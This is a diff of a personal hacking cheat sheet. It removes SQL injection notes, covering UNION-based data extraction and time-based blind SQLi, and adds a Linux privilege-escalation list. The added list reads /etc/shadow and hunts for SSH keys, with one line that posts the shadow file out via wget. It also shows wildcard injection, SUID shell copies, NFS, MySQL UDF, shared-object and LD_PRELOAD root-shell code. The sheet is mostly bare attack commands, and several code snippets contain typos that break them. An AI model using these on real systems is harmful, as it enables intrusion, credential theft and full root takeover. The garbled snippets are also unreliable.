@@ -1,64 +1,182 @@
-# Linux-Privilege-Esc
-
-SQL INJECTION
-**Syntax**
-1. SELECT USERNAMES,PASSWORD FROM **TABLE** WHERE ID=X
-2. SELECT * FROM **TABLE** //Select all 
-
-**Como IDENTIFICAR**
->1. ' = file?products=Gifts' = ERROR SYNTAX OR 500 INTERNAL ERROR
-
-**DETECTING NUMBER OF COLUMNS**
->1. ORDER BY 1--+    #True
->2. order BY 2--     #True
->3. ORDER BY 3-- -   #True
->4. ORDER BY 4-- -   #False
-* The database has 3
-           GROUP BY x 
-           UNION SELECT NULL,NULL,NULL -- -
-
-**EXTRAER DATA**
-
-> 1. union select NULL,USERNAME,PASSWORD FROM ***TABLE***
+System enumeration
+> hostname 
+> uname -a //For listing the version of the Linux OS using to find if the version its vulnerable
+> cat /proc/version 
+	/etc/*release
+	/etc/lsb-release
+	/etc/redhat-release
+	
+> cat /etc/issue
+> ps aux // To list all the service are running on the device PD: you can see the user using pipping you can grep for the one which the root user it's actually 
+running
 
 
-***VERSION DE LA BASE Y CONTENIDO***
+ User Enumeration
+> whoami
+> id 
+> sudo -l
+> cat /etc/passwd
+> cat /etc/shadow //password hased use JOHNN to  brute force it 
+> cat /etc/group 
 
-**Base Version**
-*Oracle* 
 
-        SELECT banner FROM v$version
-        
-        SELECT version FROM v$instance
-> *Microsoft and MySQl* 
+ Network Enumeration
+> ifconfig
+> ip route 
+> arp -a
+> ip neigh
+> netsat //Win users and Linux OS users
 
-         version@@
-> *Postgres*
 
-        version()
-    
-**Contenidos**
-> 1. union select null,schema_name from information_schema.schemata
-> 2. union select null,table_name from infomrmation_schema.tables where table_schema = 'Nombre de la data base'
-> 3. union select null,column_name from information_schema.tables where table_name = 'Table name'
-> 4. union select x,y from table_nmae
-* **ORACLE TYPE**
-> 1. union select distinct owner,null from all_tables
-> 2. union select owner,table_name from all_tables
-> 3. union select column_name,null from all_tab_columns where table_name = 'Nombre de la tabla'
-> 4. union select x,y from table_name
+Password Huting
+>grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always // Grep for files which contains PASSWORD word or password initication
 
-**Cheatsheets**
-> 1.union select null, version() / Version de la SQL
-> 2.union select null,user() / Quien esta usando la base de datos
-> 3.union select null,load_file("/etc/passwd")
-> 4.union select null,database() / te nombra la base de datos en uso
+Weak Files
+> cat /etc/passwd
+> cat /etc/shadow
+> unshadow passwd shadow
+> find / -name authotirzed_key -type f 2>/dev/null
+> find / -name id_rsa 2>/dev/null
+> chmod 600 id_ rsa = ssh -i id_rsa user@ip -p port
 
-**Bypass**
-> Convertir en Hex tables_schema 
+Sudo
+> sudo -l to see all the files
+    > vim : sudo vim -c '!sh'
+    > apache2 : sudo apache2 /etc/shadow to see unauthorized files
+    > wget : --post-file=/etc/shadow to your machine....
+```
+More on GTFobins
+```
 
-**Blind SQLi**
-    Base de datos = Colegio
-> 1. union select null, and if(substr(database(),1,1)='c',sleep(5),1);
-        Estamos comprobando con la funcion de substr el nombre de la base de datos si empieza por la 'c' y si empieza por la 'c' que tarde 5 segundos en respondernos. Para el segundo valor seria if(substr(database(),2,1)='o',sleep(5),1);
+Capabilities
+> getcap -r / 2>/dev/null
+> which python3
+> usr/bin/python3 = ./python3 'import os; os.setuid(0); os.system("/bin/bash")'
 
+Crontab
+> normal path = cat /etc/crontab 
+> to see the process and use it to execute privilege escalation
+
+Wildcard
+
+ create file for exploitation
+> touch ruta "--checkpoint=1"
+> touch ruta "--checkpoint-action=exec=sh shell.sh"
+> echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
+> echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > exploit.sh
+> /tmp/bash -p
+  vulnerable script
+> tar cf archive.tar *
+
+SUID
+
+> find / -perm -4000 -type f 2>/dev/null
+> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null //FInd all SUID and SGID
+NFS
+
+>cat /etc/exports
+>Track for no_root_squash files = the file is sharedable and mounteable
+>showmount -o <IP>
+> mkdir /tmp/mountme
+>mount -o rw.vers=2 <IP>:/tmp /tmp/mountme
+> echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0}' > /tmp/mountme/x.c
+>gcc /tmp/mountme/x.c -p /tmp/mountme/x
+>chmod +x /tmp/mountme/x
+> And execute ./x
+   
+Service Exploits   
+   
+   > 	cd /home/user/tools/mysql-udf
+   >	gcc -g -c raptor_udf2.c -fPIC
+   >	gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+   
+   >mysql -u root 
+   >use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+> /tmp/rootbash -p
+
+   
+Shared Object Injection
+
+> find / -type f -perm -4000 -ls  2>/dev/null
+
+> strace PATH 2>/dev/null
+ //Hunt for no such file or directory and write a code which give us root shell permissions
+  grep -i -E “open|acess|no such file”
+  
+  
+  CODE::
+  
+  #include <stdio.h>
+  #include <stdlib.h>
+  
+  stactic void injec() __attribute>>((constructor));
+  
+  void inject(){
+	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");  
+  }
+  
+  gcc -shared -fPIC -o /PATH/PATH/Original name.so 
+  
+  Binary Symlinks (nginx exploit)
+  
+  > dpkg -l | grep nginx 
+  
+  > We need the SUID set to Sudo to get the exploit work 
+  >./nginxed-root.sh /var/log/nginx/error.log
+  
+  
+	Enviromental
+	
+	> env 
+	
+	> find / -perm -4000 2>/dev/null
+	
+	find env suid's
+	
+	> echo “int main(){ setgui(0); setuid(0); system("/bin/bash"); return0;}” > /tmp/service.c
+	> gcc /tmp/service.c -o /tmp/service
+	> export path=/tmp:$PATH
+	// execute the suid
+	
+	
+		- If they are calling directly fron /usr/bin/X the service we have another way to do this
+		
+	function usr/sbin/service() {cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p;}	
+	
+	export -f /usr/sbin/service
+	
+	and execute the suid
+	
+	
+	
+		Apache2
+				
+		sudo apache2 -f /etc/shadow
+		
+	
+		LD_PRELOAD
+		
+		sudo -l 
+		
+		code :
+		
+		#include <stdio.h>
+		#include <sys/types.h>
+		#include <stdlib.h>
+		
+		void_init(){
+		unsetenv("LD_PRELOAD");
+		setgid(0);
+		setuid(0);
+		system("/bin/bash")		
+		
+		}
+			
+		gcc -fPIC -shared -o /tmp/x.so x.c -nostarfiles
+		
+		sudo LD_PRELOAD=/tmp/.so apache2
